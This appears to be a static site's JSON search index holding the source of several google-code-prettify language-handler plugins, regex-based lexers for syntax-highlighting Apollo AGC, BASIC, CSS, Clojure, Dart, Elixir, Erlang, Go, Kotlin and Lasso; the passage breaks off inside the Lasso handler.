{"pages":[{"title":"categories","text":"","path":"categories/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"","text":"/** * @license * Copyright (C) 2009 Onno Hommes. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the AGC/AEA Assembly Language as described * at http://virtualagc.googlecode.com * * This file could be used by goodle code to allow syntax highlight for * Virtual AGC SVN repository or if you don't want to commonize * the header for the agc/aea html assembly listing. * * @author ohommes@alumni.cmu.edu */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // A line comment that starts with ; [PR['PR_COMMENT'], /^#[^\\r\\n]*/, null, '#'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ [PR['PR_KEYWORD'], /^(?:ADS|AD|AUG|BZF|BZMF|CAE|CAF|CA|CCS|COM|CS|DAS|DCA|DCOM|DCS|DDOUBL|DIM|DOUBLE|DTCB|DTCF|DV|DXCH|EDRUPT|EXTEND|INCR|INDEX|NDX|INHINT|LXCH|MASK|MSK|MP|MSU|NOOP|OVSK|QXCH|RAND|READ|RELINT|RESUME|RETURN|ROR|RXOR|SQUARE|SU|TCR|TCAA|OVSK|TCF|TC|TS|WAND|WOR|WRITE|XCH|XLQ|XXALQ|ZL|ZQ|ADD|ADZ|SUB|SUZ|MPY|MPR|MPZ|DVP|COM|ABS|CLA|CLZ|LDQ|STO|STQ|ALS|LLS|LRS|TRA|TSQ|TMI|TOV|AXT|TIX|DLY|INP|OUT)\\s/,null], [PR['PR_TYPE'], /^(?:-?GENADR|=MINUS|2BCADR|VN|BOF|MM|-?2CADR|-?[1-6]DNADR|ADRES|BBCON|[SE]?BANK\\=?|BLOCK|BNKSUM|E?CADR|COUNT\\*?|2?DEC\\*?|-?DNCHAN|-?DNPTR|EQUALS|ERASE|MEMORY|2?OCT|REMADR|SETLOC|SUBRO|ORG|BSS|BES|SYN|EQU|DEFINE|END)\\s/,null], // A single quote possibly followed by a word that optionally ends with // = ! or ?. [PR['PR_LITERAL'], /^\\'(?:-*(?:\\w|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?)?/], // Any word including labels that optionally ends with = ! or ?. [PR['PR_PLAIN'], /^-*(?:[!-z_]|\\\\[\\x21-\\x7e])(?:[\\w-]*|\\\\[\\x21-\\x7e])[=!?]?/i], // A printable non-space non-special character [PR['PR_PUNCTUATION'], /^[^\\w\\t\\n\\r \\xA0()\\\"\\\\\\';]+/] ]), ['apollo', 'agc', 'aea']);","path":"plugins/prettify/lang-apollo.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Peter Kofler * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ // Contributed by peter dot kofler at code minus cop dot org /** * @fileoverview * Registers a language handler for Basic. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my BASIC code) * * @author peter dot kofler at code minus cop dot org */ PR.registerLangHandler( PR.createSimpleLexer( [ // shortcutStylePatterns // \"single-line-string\" [PR.PR_STRING, /^(?:\"(?:[^\\\\\"\\r\\n]|\\\\.)*(?:\"|$))/, null, '\"'], // Whitespace [PR.PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0'] ], [ // fallthroughStylePatterns // A line comment that starts with REM [PR.PR_COMMENT, /^REM[^\\r\\n]*/, null], [PR.PR_KEYWORD, /^\\b(?:AND|CLOSE|CLR|CMD|CONT|DATA|DEF ?FN|DIM|END|FOR|GET|GOSUB|GOTO|IF|INPUT|LET|LIST|LOAD|NEW|NEXT|NOT|ON|OPEN|OR|POKE|PRINT|READ|RESTORE|RETURN|RUN|SAVE|STEP|STOP|SYS|THEN|TO|VERIFY|WAIT)\\b/, null], [PR.PR_PLAIN, /^[A-Z][A-Z0-9]?(?:\\$|%)?/i, null], // Literals .0, 0, 0.0 0E13 [PR.PR_LITERAL, /^(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:e[+\\-]?\\d+)?/i, null, '0123456789'], [PR.PR_PUNCTUATION, /^.[^\\s\\w\\.$%\"]*/, null] // [PR.PR_PUNCTUATION, /^[-,:;!=\\+^\\/\\*]+/] ]), ['basic','cbm']);","path":"plugins/prettify/lang-basic.js"},{"title":"","text":"/** * @license * Copyright (C) 2009 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for CSS. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * * * * http://www.w3.org/TR/CSS21/grammar.html Section G2 defines the lexical * grammar. This scheme does not recognize keywords containing escapes. * * @author mikesamuel@gmail.com */ // This file is a call to a function defined in prettify.js which defines a // lexical scanner for CSS and maps tokens to styles. // The call to PR['registerLangHandler'] is quoted so that Closure Compiler // will not rename the call so that this language extensions can be // compiled/minified separately from one another. Other symbols defined in // prettify.js are similarly quoted. // The call is structured thus: // PR['registerLangHandler']( // PR['createSimpleLexer']( // shortcutPatterns, // fallThroughPatterns), // [languageId0, ..., languageIdN]) // Langugage IDs // ============= // The language IDs are typically the file extensions of source files for // that language so that users can syntax highlight arbitrary files based // on just the extension. This is heuristic, but works pretty well in // practice. // Patterns // ======== // Lexers are typically implemented as a set of regular expressions. // The SimpleLexer function takes regular expressions, styles, and some // pragma-info and produces a lexer. A token description looks like // [STYLE_NAME, /regular-expression/, pragmas] // Initially, simple lexer's inner loop looked like: // while sourceCode is not empty: // try each regular expression in order until one matches // remove the matched portion from sourceCode // This was really slow for large files because some JS interpreters // do a buffer copy on the matched portion which is O(n*n) // The current loop now looks like // 1. use js-modules/combinePrefixPatterns.js to // combine all regular expressions into one // 2. use a single global regular expresion match to extract all tokens // 3. for each token try regular expressions in order until one matches it // and classify it using the associated style // This is a lot more efficient but it does mean that lookahead and lookbehind // can't be used across boundaries to classify tokens. // Sometimes we need lookahead and lookbehind and sometimes we want to handle // embedded language -- JavaScript or CSS embedded in HTML, or inline assembly // in C. // If a particular pattern has a numbered group, and its style pattern starts // with \"lang-\" as in // ['lang-js', /(.*?)/] // then the token classification step breaks the token into pieces. // Group 1 is re-parsed using the language handler for \"lang-js\", and the // surrounding portions are reclassified using the current language handler. // This mechanism gives us both lookahead, lookbehind, and language embedding. // Shortcut Patterns // ================= // A shortcut pattern is one that is tried before other patterns if the first // character in the token is in the string of characters. // This very effectively lets us make quick correct decisions for common token // types. // All other patterns are fall-through patterns. // The comments inline below refer to productions in the CSS specification's // lexical grammar. See link above. PR['registerLangHandler']( PR['createSimpleLexer']( // Shortcut patterns. [ // The space production [PR['PR_PLAIN'], /^[ \\t\\r\\n\\f]+/, null, ' \\t\\r\\n\\f'] ], // Fall-through patterns. [ // Quoted strings. and [PR['PR_STRING'], /^\\\"(?:[^\\n\\r\\f\\\\\\\"]|\\\\(?:\\r\\n?|\\n|\\f)|\\\\[\\s\\S])*\\\"/, null], [PR['PR_STRING'], /^\\'(?:[^\\n\\r\\f\\\\\\']|\\\\(?:\\r\\n?|\\n|\\f)|\\\\[\\s\\S])*\\'/, null], ['lang-css-str', /^url\\(([^\\)\\\"\\']+)\\)/i], [PR['PR_KEYWORD'], /^(?:url|rgb|\\!important|@import|@page|@media|@charset|inherit)(?=[^\\-\\w]|$)/i, null], // A property name -- an identifier followed by a colon. ['lang-css-kw', /^(-?(?:[_a-z]|(?:\\\\[0-9a-f]+ ?))(?:[_a-z0-9\\-]|\\\\(?:\\\\[0-9a-f]+ ?))*)\\s*:/i], // A C style block comment. The production. [PR['PR_COMMENT'], /^\\/\\*[^*]*\\*+(?:[^\\/*][^*]*\\*+)*\\//], // Escaping text spans [PR['PR_COMMENT'], /^(?:)/], // A number possibly containing a suffix. [PR['PR_LITERAL'], /^(?:\\d+|\\d*\\.\\d+)(?:%|[a-z]+)?/i], // A hex color [PR['PR_LITERAL'], /^#(?:[0-9a-f]{3}){1,2}\\b/i], // An identifier [PR['PR_PLAIN'], /^-?(?:[_a-z]|(?:\\\\[\\da-f]+ ?))(?:[_a-z\\d\\-]|\\\\(?:\\\\[\\da-f]+ ?))*/i], // A run of punctuation [PR['PR_PUNCTUATION'], /^[^\\s\\w\\'\\\"]+/] ]), ['css']); // Above we use embedded languages to highlight property names (identifiers // followed by a colon) differently from identifiers in values. PR['registerLangHandler']( PR['createSimpleLexer']([], [ [PR['PR_KEYWORD'], /^-?(?:[_a-z]|(?:\\\\[\\da-f]+ ?))(?:[_a-z\\d\\-]|\\\\(?:\\\\[\\da-f]+ ?))*/i] ]), ['css-kw']); // The content of an unquoted URL literal like url(http://foo/img.png) should // be colored as string content. This language handler is used above in the // URL production to do so. PR['registerLangHandler']( PR['createSimpleLexer']([], [ [PR['PR_STRING'], /^[^\\)\\\"\\']+/] ]), ['css-str']);","path":"plugins/prettify/lang-css.js"},{"title":"","text":"/** * @license Copyright (C) 2011 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Clojure. * * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (my lisp code) * The lang-cl class identifies the language as common lisp. * This file supports the following language extensions: * lang-clj - Clojure * * * I used lang-lisp.js as the basis for this adding the clojure specific * keywords and syntax. * * \"Name\" = 'Clojure' * \"Author\" = 'Rich Hickey' * \"Version\" = '1.2' * \"About\" = 'Clojure is a lisp for the jvm with concurrency primitives and a richer set of types.' * * * I used Clojure.org Reference as * the basis for the reserved word list. * * * @author jwall@google.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // clojure has more paren types than minimal lisp. ['opn', /^[\\(\\{\\[]+/, null, '([{'], ['clo', /^[\\)\\}\\]]+/, null, ')]}'], // A line comment that starts with ; [PR['PR_COMMENT'], /^;[^\\r\\n]*/, null, ';'], // Whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // A double quoted, possibly multi-line, string. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'] ], [ // clojure has a much larger set of keywords [PR['PR_KEYWORD'], /^(?:def|if|do|let|quote|var|fn|loop|recur|throw|try|monitor-enter|monitor-exit|defmacro|defn|defn-|macroexpand|macroexpand-1|for|doseq|dosync|dotimes|and|or|when|not|assert|doto|proxy|defstruct|first|rest|cons|defprotocol|deftype|defrecord|reify|defmulti|defmethod|meta|with-meta|ns|in-ns|create-ns|import|intern|refer|alias|namespace|resolve|ref|deref|refset|new|set!|memfn|to-array|into-array|aset|gen-class|reduce|map|filter|find|nil?|empty?|hash-map|hash-set|vec|vector|seq|flatten|reverse|assoc|dissoc|list|list?|disj|get|union|difference|intersection|extend|extend-type|extend-protocol|prn)\\b/, null], [PR['PR_TYPE'], /^:[0-9a-zA-Z\\-]+/] ]), ['clj']);","path":"plugins/prettify/lang-clj.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler Dart. * Loosely structured based on the DartLexer in Pygments: http://pygments.org/. * * To use, include prettify.js and this file in your HTML page. * Then put your code in an HTML tag like * (Dart code) * * @author armstrong.timothy@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'] ], [ // Script tag. [PR['PR_COMMENT'], /^#!(?:.*)/], // `import`, `library`, `part of`, `part`, `as`, `show`, and `hide` // keywords. [PR['PR_KEYWORD'], /^\\b(?:import|library|part of|part|as|show|hide)\\b/i], // Single-line comments. [PR['PR_COMMENT'], /^\\/\\/(?:.*)/], // Multiline comments. [PR['PR_COMMENT'], /^\\/\\*[^*]*\\*+(?:[^\\/*][^*]*\\*+)*\\//], // */ // `class` and `interface` keywords. [PR['PR_KEYWORD'], /^\\b(?:class|interface)\\b/i], // General keywords. [PR['PR_KEYWORD'], /^\\b(?:assert|async|await|break|case|catch|continue|default|do|else|finally|for|if|in|is|new|return|super|switch|sync|this|throw|try|while)\\b/i], // Declaration keywords. [PR['PR_KEYWORD'], /^\\b(?:abstract|const|extends|factory|final|get|implements|native|operator|set|static|typedef|var)\\b/i], // Keywords for types. [PR['PR_TYPE'], /^\\b(?:bool|double|Dynamic|int|num|Object|String|void)\\b/i], // Keywords for constants. [PR['PR_KEYWORD'], /^\\b(?:false|null|true)\\b/i], // Multiline strings, single- and double-quoted. [PR['PR_STRING'], /^r?[\\']{3}[\\s|\\S]*?[^\\\\][\\']{3}/], [PR['PR_STRING'], /^r?[\\\"]{3}[\\s|\\S]*?[^\\\\][\\\"]{3}/], // Normal and raw strings, single- and double-quoted. [PR['PR_STRING'], /^r?\\'(\\'|(?:[^\\n\\r\\f])*?[^\\\\]\\')/], [PR['PR_STRING'], /^r?\\\"(\\\"|(?:[^\\n\\r\\f])*?[^\\\\]\\\")/], // Types are capitalized by convention. [PR['PR_TYPE'], /^[A-Z]\\w*/], // Identifiers. [PR['PR_PLAIN'], /^[a-z_$][a-z0-9_]*/i], // Operators. [PR['PR_PUNCTUATION'], /^[~!%^&*+=|?:/-]/], // Hex numbers. [PR['PR_LITERAL'], /^\\b0x[0-9a-f]+/i], // Decimal numbers. [PR['PR_LITERAL'], /^\\b\\d+(?:\\.\\d*)?(?:e[+-]?\\d+)?/i], [PR['PR_LITERAL'], /^\\b\\.\\d+(?:e[+-]?\\d+)?/i], // Punctuation. [PR['PR_PUNCTUATION'], /^[(){}\\[\\],.;]/] ]), ['dart']);","path":"plugins/prettify/lang-dart.js"},{"title":"","text":"/** * @license * Copyright (C) 2017 Jacek Królikowski * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Elixir. * * @author nietaki@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // # comments [PR['PR_COMMENT'], /^#.*/, null, '#'], // a (possibly multiline) charlist [PR['PR_LITERAL'], /^'(?:[^'\\\\]|\\\\(?:.|\\n|\\r))*'?/, null, '\\''], // @attributes [PR['PR_ATTRIB_NAME'], /^@\\w+/, null, '@'], [PR['PR_PUNCTUATION'], /^[!%&()*+,\\-;?\\[\\\\\\]^{|}]+/, null, '!%&()*+,-;?[\\\\]^{|}'], // Borrowed from lang-erlang.js: [PR['PR_LITERAL'], /^(?:0o[0-7](?:[0-7]|_[0-7])*|0x[\\da-fA-F](?:[\\da-fA-F]|_[\\da-fA-F])*|\\d(?:\\d|_\\d)*(?:\\.\\d(?:\\d|_\\d)*)?(?:[eE][+\\-]?\\d(?:\\d|_\\d)*)?)/, null, '0123456789'] ], [ // the iex> prompt for interactive examples [PR['PR_ATTRIB_NAME'], /^iex(?:\\(\\d+\\))?> /], // special case for binaries, so that they don't get presented like atoms [PR['PR_PUNCTUATION'], /^::/], // atoms - :__a_word or :\"colon followed by a string\" [PR['PR_LITERAL'], /^:(?:\\w+[\\!\\?\\@]?|\"(?:[^\"\\\\]|\\\\.)*\"?)/], // compile-time information [PR['PR_ATTRIB_NAME'], /^(?:__(?:CALLER|ENV|MODULE|DIR)__)/], // keywords [PR['PR_KEYWORD'], /^(?:alias|case|catch|def(?:delegate|exception|impl|macrop?|module|overridable|p?|protocol|struct)|do|else|end|fn|for|if|in|import|quote|raise|require|rescue|super|throw|try|unless|unquote(?:_splicing)?|use|when|with|yield)\\b/], [PR['PR_LITERAL'], /^(?:true|false|nil)\\b/], // atoms as keyword list keys // NOTE: this does also handle the %{\"I'm an atom\": :foo} case // // Contains negative lookahead to handle [PR['PR_LITERAL'], /^(?:\\w+[\\!\\?\\@]?|\"(?:[^\"\\\\]|\\\\.)*\"):(?!:)/], // heredoc: triple double-quoted multi-line string. // // NOTE: the opening \"\"\" needs to be followed by a newline [PR['PR_STRING'], /^\"\"\"\\s*(\\r|\\n)+(?:\"\"?(?!\")|[^\\\\\"]|\\\\(?:.|\\n|\\r))*\"{0,3}/], // A double-quoted multi-line string [PR['PR_STRING'], /^\"(?:[^\"\\\\]|\\\\(?:.|\\n|\\r))*\"?(?!\")/], // types [PR['PR_TYPE'], /^[A-Z]\\w*/], // variables not meant to be used or private functions [PR['PR_COMMENT'], /^_\\w*/], // plain: variables, functions, ... [PR['PR_PLAIN'], /^[$a-z]\\w*[\\!\\?]?/], // sigils with the same starting and ending character. // Key part: X(?:[^X\\r\\n\\\\]|\\\\.)+X where X is the sigil character [PR['PR_ATTRIB_VALUE'], /^~[A-Z](?:\\/(?:[^\\/\\r\\n\\\\]|\\\\.)+\\/|\\|(?:[^\\|\\r\\n\\\\]|\\\\.)+\\||\"(?:[^\"\\r\\n\\\\]|\\\\.)+\"|'(?:[^'\\r\\n\\\\]|\\\\.)+')[A-Z]*/i], // sigils with a different starting and ending character. // Key part: X(?:[^Y\\r\\n\\\\]|\\\\.)+Y where X and Y are the starting and ending characters [PR['PR_ATTRIB_VALUE'], /^~[A-Z](?:\\((?:[^\\)\\r\\n\\\\]|\\\\.)+\\)|\\[(?:[^\\]\\r\\n\\\\]|\\\\.)+\\]|\\{(?:[^\\}\\r\\n\\\\]|\\\\.)+\\}|\\\\r\\n\\\\]|\\\\.)+\\>)[A-Z]*/i], [PR['PR_PUNCTUATION'], /^(?:\\.+|\\/|[:~])/] ]), ['ex','exs']);","path":"plugins/prettify/lang-ex.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Andrew Allen * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Erlang. * * Derived from https://raw.github.com/erlang/otp/dev/lib/compiler/src/core_parse.yrl * Modified from Mike Samuel's Haskell plugin for google-code-prettify * * @author achew22@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace // whitechar -> newline | vertab | space | tab | uniWhite // newline -> return linefeed | return | linefeed | formfeed [PR['PR_PLAIN'], /^[\\t\\n\\x0B\\x0C\\r ]+/, null, '\\t\\n\\x0B\\x0C\\r '], // Single line double-quoted strings. [PR['PR_STRING'], /^\\\"(?:[^\\\"\\\\\\n\\x0C\\r]|\\\\[\\s\\S])*(?:\\\"|$)/, null, '\"'], // Handle atoms [PR['PR_LITERAL'], /^[a-z][a-zA-Z0-9_]*/], // Handle single quoted atoms [PR['PR_LITERAL'], /^\\'(?:[^\\'\\\\\\n\\x0C\\r]|\\\\[^&])+\\'?/, null, \"'\"], // Handle macros. Just to be extra clear on this one, it detects the ? // then uses the regexp to end it so be very careful about matching // all the terminal elements [PR['PR_LITERAL'], /^\\?[^ \\t\\n({]+/, null, \"?\"], // decimal -> digit{digit} // octal -> octit{octit} // hexadecimal -> hexit{hexit} // integer -> decimal // | 0o octal | 0O octal // | 0x hexadecimal | 0X hexadecimal // float -> decimal . decimal [exponent] // | decimal exponent // exponent -> (e | E) [+ | -] decimal [PR['PR_LITERAL'], /^(?:0o[0-7]+|0x[\\da-f]+|\\d+(?:\\.\\d+)?(?:e[+\\-]?\\d+)?)/i, null, '0123456789'] ], [ // TODO: catch @declarations inside comments // Comments in erlang are started with % and go till a newline [PR['PR_COMMENT'], /^%[^\\n]*/], // Catch macros //[PR['PR_TAG'], /?[^( \\n)]+/], /** * %% Keywords (atoms are assumed to always be single-quoted). * 'module' 'attributes' 'do' 'let' 'in' 'letrec' * 'apply' 'call' 'primop' * 'case' 'of' 'end' 'when' 'fun' 'try' 'catch' 'receive' 'after' */ [PR['PR_KEYWORD'], /^(?:module|attributes|do|let|in|letrec|apply|call|primop|case|of|end|when|fun|try|catch|receive|after|char|integer|float,atom,string,var)\\b/], /** * Catch definitions (usually defined at the top of the file) * Anything that starts -something */ [PR['PR_KEYWORD'], /^-[a-z_]+/], // Catch variables [PR['PR_TYPE'], /^[A-Z_][a-zA-Z0-9_]*/], // matches the symbol production [PR['PR_PUNCTUATION'], /^[.,;]/] ]), ['erlang', 'erl']);","path":"plugins/prettify/lang-erlang.js"},{"title":"","text":"/** * @license * Copyright (C) 2010 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for the Go language.. * * Based on the lexical grammar at * http://golang.org/doc/go_spec.html#Lexical_elements * * Go uses a minimal style for highlighting so the below does not distinguish * strings, keywords, literals, etc. by design. * From a discussion with the Go designers: * * On Thursday, July 22, 2010, Mike Samuel wrote: * > On Thu, Jul 22, 2010, Rob 'Commander' Pike wrote: * >> Personally, I would vote for the subdued style godoc presents at http://golang.org * >> * >> Not as fancy as some like, but a case can be made it's the official style. * >> If people want more colors, I wouldn't fight too hard, in the interest of * >> encouragement through familiarity, but even then I would ask to shy away * >> from technicolor starbursts. * > * > Like http://golang.org/pkg/go/scanner/ where comments are blue and all * > other content is black? I can do that. * * * @author mikesamuel@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // Whitespace is made up of spaces, tabs and newline characters. [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // Not escaped as a string. See note on minimalism above. [PR['PR_PLAIN'], /^(?:\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S])*(?:\\\"|$)|\\'(?:[^\\'\\\\]|\\\\[\\s\\S])+(?:\\'|$)|`[^`]*(?:`|$))/, null, '\"\\''] ], [ // Block comments are delimited by /* and */. // Single-line comments begin with // and extend to the end of a line. [PR['PR_COMMENT'], /^(?:\\/\\/[^\\r\\n]*|\\/\\*[\\s\\S]*?\\*\\/)/], [PR['PR_PLAIN'], /^(?:[^\\/\\\"\\'`]|\\/(?![\\/\\*]))+/i] ]), ['go']);","path":"plugins/prettify/lang-go.js"},{"title":"","text":"/** * @license * Copyright (C) 2017 Michał Bączkowski * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Kotlin. * * Limitations: * - doesn't support string interpolation (\"$var\") * - doesn't support labels if there is no space between the keyword (break@loop, loop@for) * * @author mibac138@gmail.com */ PR['registerLangHandler']( PR['createSimpleLexer']( [ [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], [PR['PR_PUNCTUATION'], /^[.!%&()*+,\\-;?\\[\\\\\\]^{|}:]+/, null, '.!%&()*+,-;?[\\\\]^{|}:'] ], [ // keywords [PR['PR_KEYWORD'], /^\\b(package|public|protected|private|open|abstract|constructor|final|override|import|for|while|as|typealias|get|set|((data|enum|annotation|sealed) )?class|this|super|val|var|fun|is|in|throw|return|break|continue|(companion )?object|if|try|else|do|when|init|interface|typeof)\\b/], [PR['PR_LITERAL'], /^(?:true|false|null)\\b/], // number literals [PR['PR_LITERAL'], /^(0[xX][0-9a-fA-F_]+L?|0[bB][0-1]+L?|[0-9_.]+([eE]-?[0-9]+)?[fFL]?)/], [PR['PR_TYPE'], /^(\\b[A-Z]+[a-z][a-zA-Z0-9_$@]*|`.*`)/, null], //double slash comments [PR['PR_COMMENT'], /^\\/\\/.*/], //slash star comments and documentation [PR['PR_COMMENT'], /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/], // char [PR['PR_STRING'], /'.'/], // string [PR['PR_STRING'], /^\"([^\"\\\\]|\\\\[\\s\\S])*\"/], // multiline string [PR['PR_STRING'], /^\"{3}[\\s\\S]*?[^\\\\]\"{3}/], // annotation (and label) [PR['PR_LITERAL'], /^@([a-zA-Z0-9_$@]*|`.*`)/], // label definition [PR['PR_LITERAL'], /^[a-zA-Z0-9_]+@/] ]), ['kotlin']);","path":"plugins/prettify/lang-kotlin.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Eric Knibbe * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * Registers a language handler for Lasso. * * To use, include prettify.js and this file in your HTML page. * Then enclose your code in an HTML tag like so: * [your Lasso code] * * @author Eric Knibbe */ PR['registerLangHandler']( PR['createSimpleLexer']( [ // whitespace [PR['PR_PLAIN'], /^[\\t\\n\\r \\xA0]+/, null, '\\t\\n\\r \\xA0'], // single quote strings [PR['PR_STRING'], /^\\'[^\\'\\\\]*(?:\\\\[\\s\\S][^\\'\\\\]*)*(?:\\'|$)/, null, \"'\"], // double quote strings [PR['PR_STRING'], /^\\\"[^\\\"\\\\]*(?:\\\\[\\s\\S][^\\\"\\\\]*)*(?:\\\"|$)/, null, '\"'], // ticked strings [PR['PR_STRING'], /^\\`[^\\`]*(?:\\`|$)/, null, '`'], // numeral as integer or hexidecimal [PR['PR_LITERAL'], /^0x[\\da-f]+|\\d+/i, null, '0123456789'], // local or thread variables, or hashbang [PR['PR_ATTRIB_NAME'], /^[#$][a-z_][\\w.]*|#\\d+\\b|#![ \\S]+lasso9\\b/i, null, '#$'] ], [ // square or angle bracket delimiters [PR['PR_TAG'], /^[[\\]]||(no_square_brackets|noprocess)\\b/i], // single-line or block comments [PR['PR_COMMENT'], /^\\/\\/[^\\r\\n]*|\\/\\*[\\s\\S]*?\\*\\//], // member variables or keyword parameters [PR['PR_ATTRIB_NAME'], /^-(?!infinity)[a-z_][\\w.]*|\\.\\s*'[a-z_][\\w.]*'|\\.{3}/i], // numeral as decimal or scientific notation [PR['PR_LITERAL'], /^\\d*\\.\\d+(?:e[-+]?\\d+)?|(infinity|NaN)\\b/i], // tag literals [PR['PR_ATTRIB_VALUE'], /^::\\s*[a-z_][\\w.]*/i], // constants [PR['PR_LITERAL'], /^(?:true|false|none|minimal|full|all|void|and|or|not|bw|nbw|ew|new|cn|ncn|lt|lte|gt|gte|eq|neq|rx|nrx|ft)\\b/i], // standard type or variable declarations [PR['PR_TYPE'], /^(?:array|date|decimal|duration|integer|map|pair|string|tag|xml|null|boolean|bytes|keyword|list|locale|queue|set|stack|staticarray|local|var|variable|global|data|self|inherited|currentcapture|givenblock)\\b|^\\.\\.?/i], // container or control keywords [PR['PR_KEYWORD'], 